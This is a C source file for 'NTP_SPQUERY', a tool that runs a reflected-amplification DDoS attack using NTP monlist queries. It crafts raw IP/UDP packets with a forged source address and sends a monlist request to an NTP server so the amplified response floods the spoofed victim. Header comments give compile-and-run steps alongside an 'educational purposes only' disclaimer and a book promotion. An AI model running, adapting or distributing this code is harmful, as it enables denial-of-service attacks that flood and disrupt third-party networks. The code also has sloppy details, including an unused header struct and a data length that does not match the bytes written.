//   PROGRAM :   NTP_SPQUERY.c
// 
//   AUTHOR :    loud-fat-bloke /   MARK OSBORNE 
//
//   Description:
//
//    REFLECTED AMPLIFICATION NTP ATTACK
//
//    A well known security journal has asked me to do a piece on NTP ddos
//    and being a bit reactionary (OCD in other words) 
//    I figured I would show that NTP and DNS DrdOS are related and conform to a common formulae.  
//    Therefore I have used the DNS_SPQUERY program I wrote 6 months ago to convert into NTP_SQUERY with minimal changes
//
//    NTP_SPQUERY.C is an "monlist query"  REFLECTED AMPLIFICATION NTP ATTACK that are common in March 2014
//
//
//   As part of the charity project
//                                 "CyberAttack CyberCrime CyberWarfare Cyber-Complacency" 
//   
//   I have tried to use a book, youtube presentations, in person lectures and Android Apps to Highlight three key cyber points :
//   1 - that in europe a cyber attack by any group of proficient computer literate parties could cripple the infrastructure
//   2 - that formalised cyber security  monitoring is required to prevent this - not militaristic, counter espionage initiatives 
//       which are hang overs from the cold ware
//   3 - Privacy campaigners generaly make things work by assuming "cyber security" monitoring fits into this
//       espionage initiatives describes above 
//
//   charity project? -  proceeds from the book, the APPs and personal appearances go to medical charity for sepsis awareness 
//
//
//  **** DO NO HARM WITH THIS PROGRAM *********
//  
//  the author has produced it for educational purposes only 
// 
//
/*   to build and run me  cut and paste the below 10 lines into your shell on a nice LINUX box
# compile  me 
#
  gcc   ntp_spquery.c -o ntp_spquery
#
# run me                                                                                                      
#               SPOOFED_S_IP         NTP SERVER TARGET         
./ntp_spquery   192.168.0.121        192.168.0.120           
#
#
#
#
*/
char *pretty= "\n ---------------------------------------------------------------------------------- \n";
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>     
#include <string.h>         
#include <netdb.h>         
#include <sys/types.h>    
#include <sys/socket.h>  
#include <netinet/in.h>    
#include <netinet/ip.h>   
#include <netinet/udp.h> 
#include <arpa/inet.h>  
#include <net/if.h>    
#include <sys/socket.h>
#include <syslog.h>
#include <netinet/in.h>
#include <stdio.h>
int udpsockfd,n;

#define PROGRAM    "NTP_SPQUERY"
 
 
//NTP header structure
struct NTP_HEADER
{
    unsigned short id; // identification number
 
    unsigned char li :2; // 
    unsigned char vn :3; //
    unsigned char rb :1; //
    unsigned char eb :1; //
    unsigned char mb :1; // 
    unsigned char opcode :5; 
    unsigned char data[10] ; // 
};
 
/* 
char *pretyy= "\n \n DNS_SPQUERY - Amplification and Refelector  \n\n from the book 'CyberAttack CyberCrime CyberWarefare Cyber-Complacency \n\n";
*/
           
char *pretyy= "\n \n NTP_SPQUERY - Amplification and Refelector  \n\n from the book 'CyberAttack CyberCrime CyberWarefare Cyber-Complacency \n\n";
char *pretyz= " \tIs Hollywood's blueprint for Chaos coming true' by Mark Osborne\n \t ISBN-13: 978-1493581283 ISBN-10: 1493581287 \n\n";

unsigned char buf[4000];
int data_length ;                                            

/* 


#  LeapIndicator = 0 , VersionNum = 3 or 2 , Mode = 3 (Client Mode)
#NTP v2 Monlist Request :
# data = "0x17,x00,x03,x2a,x00" 
#NTP v3 Monlist Request :
# data = "0x1b,x00,x03,x2a,x00" 
*/

// Define some constants.
#define IP4_HDRLEN 20         // IPv4 header length
#define UDP_HDRLEN  8         // UDP header length, excludes data

int
spoofudp (char *saddr,int sport, char *daddr, int   dport, int datalen,  char *udppacket)
{
  int   sd ;
  const int on = 1;
  struct ip iphdr, *iphdr_ptr;
  struct udphdr udphdr, *udphdr_ptr;
  unsigned char *data, *packet;
  struct sockaddr_in  sin;
  unsigned  char  x[10000];     // the buffer
//                                                  Allocate memory for various headers and offsets.
  packet       = x     ;
  iphdr_ptr = x     ;
//  datalen = dnslength;        
//  UDP header  ptr .
  udphdr_ptr =       (packet + IP4_HDRLEN);
//  UDP data ptr .
  data =  (packet + IP4_HDRLEN + UDP_HDRLEN);
//                                                  UDP data -copy it at the end
  memcpy (data  , udppacket ,datalen   );
// IPv4 header
  iphdr_ptr->ip_hl =5;
  iphdr_ptr->ip_v = 4;
  iphdr_ptr->ip_tos = 0;
  iphdr_ptr->ip_len = htons (IP4_HDRLEN + UDP_HDRLEN + datalen);
  iphdr_ptr->ip_id = htons (0);
  iphdr_ptr->ip_off = htons (0);
  iphdr_ptr->ip_ttl = 255;
  iphdr_ptr->ip_p = IPPROTO_UDP;
  iphdr_ptr->ip_dst.s_addr = inet_addr (daddr );          
  iphdr_ptr->ip_src.s_addr = inet_addr (saddr );     /* SPOOOOPH di source IP */
  iphdr_ptr->ip_sum = 0;  //kernel do this please

//                                                   UDP header
  udphdr_ptr->source = htons (sport);
  udphdr_ptr->dest = htons (dport);
  udphdr_ptr->len = htons (UDP_HDRLEN + datalen);
  udphdr_ptr->check = 0;                              // hey misterkernal do your job for me
//                                                   zero ise sockeet  data.
  memset (&sin, 0, sizeof (struct sockaddr_in));
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = iphdr_ptr->ip_dst.s_addr;
//                                                   open a raw socket 
  if ((sd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
    perror ("socket() failed ");
    exit (2);
  }
// unless the socket is set with IP_HDRINCL a random IP datagram will go
// out on the wire  nearly all Linux kernals allow many bsd sun aix and hp dont 
  if (setsockopt (sd, IPPROTO_IP, IP_HDRINCL, &on, sizeof (on)) < 0) {
    perror ("setsockopt() failed to set IP_HDRINCL ");
    exit (3);
  }
//                                                    Send packet.
  if (sendto (sd, packet, IP4_HDRLEN + UDP_HDRLEN + datalen, 0, (struct sockaddr *) &sin, sizeof (struct sockaddr)) < 0)  {
    perror ("sendto() failed ");
    exit (EXIT_FAILURE);
  }
// Close socket descriptor.
  close (sd);
}


usage ()
  {
  fprintf(stderr,"Program Usage: \n  %s   SOURCE_DOT_ADDR  DEST_DOT_ADDR  \n\n", PROGRAM);
  exit(1);
  }

unsigned char out[1000];
int len1 = 0, len2 = 0 ,len3 = 0   ;
int pants;
 
int
main( int argc , char *argv[])
  {
  char *out_temp;
  if ( argc != 3 )
     usage();
  /*                                                                                                                                    */             printf(pretyy ) ;
  /*                                                                                                                                    */             printf(pretyz ) ;
  printf(" Spoof Source ip: \t \t %s \n Dest ip: \t \t  %s \n \n \n ",   argv[1] ,
                   argv[2]                 );
//
memset(buf,0x00,0xfF);
sprintf(buf,"%c%c%c%c%c", 0x17,0x00,0x03,0x2a,0x00);

  data_length  = 9                   ;
  printf(pretty ) ;
//
//
// my pretty 
  for (pants=0; pants < 30 ; pants++ )
    printf("%x ", buf[pants]);
//

  printf("\nNTP PACKET len \t \t %i \n" ,  data_length ) ;
//
//  Writes out a spoofed UDP Packet
//    written for my rfc 2827 survey which never got finished
//
  spoofudp (argv[1]        ,4950, argv[2]        , 123 ,  data_length, buf );
 
  return 0;
}
